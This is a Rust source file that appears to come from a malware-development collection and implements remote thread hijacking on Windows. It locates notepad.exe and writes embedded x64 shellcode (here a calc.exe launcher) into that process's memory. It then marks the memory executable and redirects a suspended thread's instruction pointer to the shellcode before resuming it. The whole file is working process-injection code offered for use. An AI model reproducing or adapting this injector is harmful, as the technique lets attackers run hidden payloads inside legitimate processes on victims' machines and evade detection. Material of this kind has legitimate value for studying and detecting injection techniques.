
/*
    Remote Thread Hijacking
    For More Codes: https://github.com/Whitecat18/Rust-for-Malware-Development.git
    @5mukx

*/

use std::{ffi::CString, mem, ptr::null_mut};

use winapi::{ctypes::c_void, um::{
    errhandlingapi::GetLastError, 
    handleapi::CloseHandle, 
    memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory}, 
    processthreadsapi::{GetThreadContext, OpenProcess, OpenThread, ResumeThread, SetThreadContext, SuspendThread}, 
    synchapi::WaitForSingleObject, 
    tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, Thread32First, Thread32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS, TH32CS_SNAPTHREAD, THREADENTRY32}, 
    winnt::{CONTEXT, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS}
}};

macro_rules! okey {
    ($msg:expr, $($arg:expr), *) => {
        println!("\\_____[+] {}", format!($msg , $($arg), *));
    }
}

macro_rules! error {
    ($msg:expr, $($arg:expr), *) => {
        println!("\\_____[-] {}",format!($msg, $($arg), *));
    }
}

#[repr(align(16))]
struct AlignedContext {
    ctx: CONTEXT,
}

fn main(){
    let shellcode: [u8; 276] = [
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
        0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
    ];

    // Search for Process Handle 
    let process_name = "notepad.exe";
    let pid = get_pid(process_name);
    okey!("Found PID : {}",pid);


    unsafe{

        let hprocess = OpenProcess(
            PROCESS_ALL_ACCESS,
            0,
            pid,
        );

        if hprocess.is_null(){
            error!("Error while Opening Process {}",GetLastError());
            return;
        }

        let hthread = find_thread(pid);

        if hthread.is_null(){
            error!("Failed to Allocate Thread: {}",GetLastError());
            return;
        }

        okey!("Thread ID: {:?}", hthread);

        let address = VirtualAllocEx(
            hprocess,
            null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if address.is_null(){
            error!("VirtualAllocEx Failed: {}",GetLastError());
            return;
        }

        let mut return_len = 0;

        let write_mem = WriteProcessMemory(
            hprocess,
            address,
            shellcode.as_ptr() as _,
            shellcode.len(),
            &mut return_len,
        );


        if write_mem == 0{
            error!("WriteProcessMemory Failed {}", GetLastError());
        }

        let mut oldprotect:u32 = 0;

        let virtual_prot = VirtualProtectEx(
            hprocess,
            address,
            shellcode.len(),
            PAGE_EXECUTE_READWRITE,
            &mut oldprotect
        );

        if virtual_prot == 0{
            error!("VirtualProtect Error: {}", GetLastError());
            return;
        }

        let mut ctx_thread: CONTEXT = std::mem::zeroed();
        ctx_thread.ContextFlags = 0 as u32;

        let mut ctx_thread = AlignedContext{
            ctx: CONTEXT{
                ContextFlags: 0 as u32,
                ..std::mem::zeroed()
            }
        };
        
        SuspendThread(hthread);
        
        let get_thread = GetThreadContext(hthread, &mut ctx_thread.ctx);
        
        if get_thread == 0{
            error!("GetThreadContext Failed: {}", GetLastError());
            return;
        }

        ctx_thread.ctx.Rip = address as u64;

        let set_thread = SetThreadContext(hthread, &ctx_thread.ctx);

        if set_thread == 0{
            error!("SetThreadContext Failed: {}",GetLastError());
            return;
        }

        okey!("Thread Executed ..{}",'!');

        ResumeThread(hthread);

        WaitForSingleObject(hthread, 0xFFFFFFFF);

    }


}


fn get_pid(process_name: &str) -> u32{
    unsafe{
        let mut pe: PROCESSENTRY32 = std::mem::zeroed();
        pe.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;

        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap.is_null(){
            error!("Error while snapshoting processes : Error : {}",GetLastError());
            std::process::exit(0);
        }

        let mut pid = 0;

        let mut result = Process32First(snap, &mut pe) != 0;

        while result{

            let exe_file = CString::from_vec_unchecked(pe.szExeFile
                .iter()
                .map(|&file| file as u8)
                .take_while(|&c| c!=0)
                .collect::<Vec<u8>>(),
            );

            if exe_file.to_str().unwrap() == process_name {
                pid = pe.th32ProcessID;
                break;
            }
            result = Process32Next(snap, &mut pe) !=0;
        }

        if pid == 0{
            error!("Unable to get PID for {}: {}",process_name , "PROCESS DOESNT EXISTS");           
            std::process::exit(0);
        }
    
        CloseHandle(snap);
        pid
    }
}

fn find_thread(pid: u32)-> *mut c_void{
    unsafe{
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

        if snap.is_null(){
            error!("Failed to Create SnapShot: {}",GetLastError());       
            std::process::exit(0);
        }

        let mut entry: THREADENTRY32 = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;
        if Thread32First(snap, &mut entry) !=0 {
            loop {
                if entry.th32OwnerProcessID == pid{
                    let hthread = OpenThread(
                        THREAD_ALL_ACCESS, 
                        0, 
                        entry.th32ThreadID);

                    if hthread.is_null(){
                        error!("Failed to open Thread {}", GetLastError());
                        std::process::exit(0);
                    }
                    return hthread;
                }

                if Thread32Next(snap, &mut entry) <= 0{
                    break;
                }
            }
        }else {
            error!("Thread not found ..{}",'!');
        }
    }
    null_mut()
}       


